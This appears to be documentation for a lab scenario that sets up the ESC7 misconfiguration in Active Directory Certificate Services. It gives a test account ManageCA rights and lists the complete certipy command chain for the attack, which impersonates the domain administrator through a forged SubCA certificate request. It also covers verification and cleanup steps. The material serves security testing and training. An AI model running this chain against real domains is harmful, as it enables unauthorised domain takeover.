# esc7

Gives `scn-esc7-user` (password `Aa1234567890!`) the ManageCA right on the CA of the target host. Installs PSPKI on the CA host (kept after disable).

Attack:

    certipy ca -u scn-esc7-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -add-officer scn-esc7-user
    certipy ca -u scn-esc7-user@<domain> -p 'Aa1234567890!' -ca <NB>-CA -enable-template SubCA
    certipy req -u scn-esc7-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template SubCA -upn administrator@<domain>   # denied, note the request id
    certipy ca -u scn-esc7-user@<domain> -p 'Aa1234567890!' -ca <NB>-CA -issue-request <id>
    certipy req -u scn-esc7-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -retrieve <id>

How to verify:

    certipy find -u scn-esc7-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout   # ESC7

Disable removes every CA ACE of the user (ManageCA and the officer right added during the attack), revokes the certificates the user requested, and deletes the user. Not cleaned: templates the attacker enabled on the CA (`certipy ca -disable-template SubCA`) and certificates issued to other requesters.
